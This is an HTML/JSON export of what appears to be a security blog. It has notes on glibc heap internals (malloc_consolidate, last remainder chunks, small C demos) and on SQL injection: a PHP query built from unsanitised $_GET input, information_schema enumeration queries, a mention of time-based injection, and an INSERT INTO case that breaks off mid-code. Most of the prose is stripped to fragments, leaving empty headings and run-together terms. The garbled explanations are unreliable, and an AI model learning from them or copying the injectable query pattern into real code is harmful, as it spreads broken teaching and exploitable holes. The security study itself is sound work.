title=\"3.\"></a>3.</h4><p><strong>mallocsmallbinchunk</strong></p>\n<ul>\n<li><p><strong></strong>fastbinschunkunsortedbinfastchunkfastchunktopchunkfastchunktopchunk_int_mallocmalloc_consolidate</p>\n</li>\n<li><p><strong></strong>mallocunsortedbinmallocchunkmallocchunkunsortedbinchunkchunklast remainder_int_mallocfor</p>\n</li>\n<li><strong></strong>chunkunsortedbinchunkbins</li>\n<li><strong></strong>malloc</li>\n</ul>\n<h4 id=\"4-\"><a href=\"#4-\" class=\"headerlink\" title=\"4.\"></a>4.</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x500</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p> </p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216141039796.png\" alt=\"image-20201216141039796\"></p>\n<p>p1 fastbin</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216141113312.png\" alt=\"image-20201216141113312\"></p>\n<p>p2 p1  </p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216141143610.png\" alt=\"image-20201216141143610\"></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216141159043.png\" alt=\"image-20201216141159043\"></p>\n<p>small binchunkconsolidate</p>\n<ol>\n<li>fastchunk unsortedbin</li>\n<li>mallocunsortedbinfreechunksmallbinsmallbinsmallchunktopchunk</li>\n<li>malloctopchunk</li>\n</ol>\n</blockquote>\n<h4 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5.\"></a>5.</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\"> \t<span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x500</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>p1p</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216142837517.png\" alt=\"image-20201216142837517\"></p>\n<p>?</p>\n<p>chunk consolidate fastchunkunsortedbin  small bins</p>\n<p>top chunk top chunk </p>\n<p>chunk</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216143203315.png\" alt=\"image-20201216143203315\"></p>\n</blockquote>\n<h3 id=\"0x14-last-remainder\"><a href=\"#0x14-last-remainder\" class=\"headerlink\" title=\"0x14 last remainder\"></a>0x14 last remainder</h3><h4 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h4><ul>\n<li>binsfreechunkmallocmallocfreechunkarenafreechunkmallocchunk<strong>last remainder</strong></li>\n<li>last remainderarena<strong>malloc_statelast_remainder</strong><strong></strong>last remainder</li>\n</ul>\n<h4 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h4><ul>\n<li>mallocmallocbinsfastbinsmallocfreechunkbinsfreechunkfreechunkchunklast remainderlast remainderunsortedbin</li>\n</ul>\n<blockquote>\n<p><strong>unsortedbinchunk</strong></p>\n<p>unsortedbinfreechunkmallocunsortedbin</p>\n<ul>\n<li>freechunkbinssmallbinlargebin</li>\n<li>binsfreechunk</li>\n<li>last remainderlast remainderunsortedbin</li>\n</ul>\n<p><strong></strong></p>\n<ul>\n<li>unsortedbin0x800freechunk</li>\n<li>0x600chunk</li>\n<li>unsortedbinconsolidate0x800freechunklargebin</li>\n<li>largebinfreechunk0x200unsortedbin</li>\n</ul>\n<p><strong>smallbinslargebinschunk</strong></p>\n<ul>\n<li>smallbinslargebinsfreechunklast remainder</li>\n<li>last remainderunsortedbin</li>\n</ul>\n</blockquote>\n<h4 id=\"3-last-remainderconsolidate\"><a href=\"#3-last-remainderconsolidate\" class=\"headerlink\" title=\"3.last remainderconsolidate\"></a>3.last remainderconsolidate</h4><p>binschunklast reminaderconsolidate<strong>consolidatefastbinsfreechunk</strong></p>\n<h4 id=\"4--1\"><a href=\"#4--1\" class=\"headerlink\" title=\"4.\"></a>4.</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span> = <span class=\"number\">0x120</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *junk = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);  <span class=\"comment\">//pqpq</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> *q = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *r = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);   <span class=\"comment\">//qqtopchunk</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"p:0x%x\\n\"</span>,p);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"q:0x%x\\n\"</span>,q);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"r:0x%x\\n\"</span>,r);</span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(p,<span class=\"string\">\"aaaaaaaabbbbbbbb\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(q,<span class=\"string\">\"ccccccccdddddddd\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(r,<span class=\"string\">\"eeeeeeeeffffffff\"</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\">\t</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(q);</span><br><span class=\"line\">\t</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x90</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216151435089.png\" alt=\"image-20201216151435089\"></p>\n<p>pq</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216151556927.png\" alt=\"image-20201216151556927\"></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216151633713.png\" alt=\"image-20201216151633713\"></p>\n<p>0x90  </p>\n<ul>\n<li>unsortedbin chunk0x90consolidate smallbins</li>\n<li> lastremainder</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216151705158.png\" alt=\"image-20201216151705158\"></p>\n</blockquote>\n<h4 id=\"5--1\"><a href=\"#5--1\" class=\"headerlink\" title=\"5.\"></a>5.</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x30</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> size2=<span class=\"number\">0x200</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p2=<span class=\"built_in\">malloc</span>(size2);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *temp=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>); <span class=\"comment\">//p2p3p2p3</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p3=<span class=\"built_in\">malloc</span>(size2);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *temp2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>); <span class=\"comment\">//p3topchunk</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p3);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>p1 p2 p3</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216155717972.png\" alt=\"image-20201216155717972\"></p>\n<p></p>\n<ul>\n<li>0x100 consolidatesmallbinfree chunk</li>\n<li>lastremainderunsortedbinfastfreechunk</li>\n<li></li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216160152597.png\" alt=\"image-20201216160152597\"></p>\n</blockquote>\n<h4 id=\"6-\"><a href=\"#6-\" class=\"headerlink\" title=\"6.\"></a>6.</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x300</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);  <span class=\"comment\">//p1topchunk</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x700</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x200</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>p1</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216160410739.png\" alt=\"image-20201216160410739\"></p>\n<p>0x700chunk smallbins</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216160827250.png\" alt=\"image-20201216160827250\"></p>\n<p>0x200 lastremainderunsortedbin</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216160910272.png\" alt=\"image-20201216160910272\"></p>\n</blockquote>\n<h4 id=\"7-\"><a href=\"#7-\" class=\"headerlink\" title=\"7.\"></a>7.</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x300</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *temp=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">//p1consolidatesmallbinsp2p1p2unsortedbin</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> *temp2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x30</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>); </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p3=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);<span class=\"comment\">//p2topchunk</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x700</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(temp);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x200</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216164710877.png\" alt=\"image-20201216164710877\"></p>\n<p>p1</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216164747866.png\" alt=\"image-20201216164747866\"></p>\n<p>0x700 unsorted binchunk top chunk</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216164913709.png\" alt=\"image-20201216164913709\"></p>\n<p>free tmpp2</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216165109899.png\" alt=\"image-20201216165109899\"></p>\n<p> malloc(0x200)mallocsmallbinsp1last remainder0x602250last remainderunsortedbinchunklast remainderconsolidateunsortedbinp2unsortedbinsmallbinsconsolidatefastbinschunkfastbinschunkfastbins</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201216165224983.png\" alt=\"image-20201216165224983\"></p>\n</blockquote>\n","categories":["PWN"],"tags":["PWN","Heap"]},{"title":"SQL","url":"https://pz1o.top/2020/12/09/SQL/","content":"<p></p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"1-SQL\"><a href=\"#1-SQL\" class=\"headerlink\" title=\"1.SQL\"></a>1.SQL</h2><ul>\n<li><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li><h4 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h4></li>\n<li><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4></li>\n<li><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4></li>\n<li><h4 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h4><ul>\n<li><h5 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h5></li>\n<li><h5 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h5></li>\n<li><h5 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h5></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li><h3 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h3><ul>\n<li><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5></li>\n<li><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5></li>\n</ul>\n</li>\n<li><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5></li>\n<li><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5></li>\n</ul>\n</li>\n<li><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5></li>\n<li><h5 id=\"cookie\"><a href=\"#cookie\" class=\"headerlink\" title=\"cookie\"></a>cookie</h5></li>\n<li><h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h2><h3 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h3><p>    concat(str1,str2)   </p>\n<p>    concat_ws(separator,str1,str2)   </p>\n<p>    group_concat(str1,str2)  </p>\n<h3 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$id=$_GET[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">$sql=<span class=\"string\">\"select * from users where id='$id' limit 0,1\"</span>;</span><br></pre></td></tr></table></figure>\n<p>    +  #%23</p>\n<p>limit 01</p>\n<p>limit 10  10</p>\n<h3 id=\"3-union\"><a href=\"#3-union\" class=\"headerlink\" title=\"3.union\"></a>3.union</h3><p>unionselectselect</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> column_names <span class=\"keyword\">from</span> table_name1 <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> column_names <span class=\"keyword\">from</span> table_name2;</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-\"><a href=\"#4-\" class=\"headerlink\" title=\"4.\"></a>4.</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">use</span> information_schema; //</span><br><span class=\"line\"><span class=\"keyword\">show</span> <span class=\"keyword\">tables</span>; </span><br><span class=\"line\"><span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema = <span class=\"string\">'myclass'</span>; //myclass</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502160256194.png\" alt=\"image-20200502160256194\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata; //</span><br><span class=\"line\"><span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"string\">''</span>; //</span><br><span class=\"line\"><span class=\"keyword\">select</span> column_name <span class=\"keyword\">form</span> information_schema.columns <span class=\"keyword\">where</span> table_name=<span class=\"string\">''</span>; //</span><br><span class=\"line\"><span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> *; //</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502161927164_WPS%E5%9B%BE%E7%89%87.png\" alt=\"image-20200502161927164_WPS\"></p>\n<h2 id=\"3-1-4\"><a href=\"#3-1-4\" class=\"headerlink\" title=\"3.1-4\"></a>3.1-4</h2><h3 id=\"1-SQL\"><a href=\"#1-SQL\" class=\"headerlink\" title=\"1.SQL\"></a>1.SQL</h3><h3 id=\"2-SQL\"><a href=\"#2-SQL\" class=\"headerlink\" title=\"2.SQL\"></a>2.SQL</h3><p>sleep()benchmark()mysql</p>\n<p>IF(expr1,expr2,expr3)expr1trueexpr2expr3</p>\n<h3 id=\"INSERT-INTO-case\"><a href=\"#INSERT-INTO-case\" class=\"headerlink\" title=\"INSERT INTO(case)\"></a>INSERT INTO(case)</h3><p>xff,explode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\"></span><br><span class=\"line\">function getIp()&#123;</span><br><span 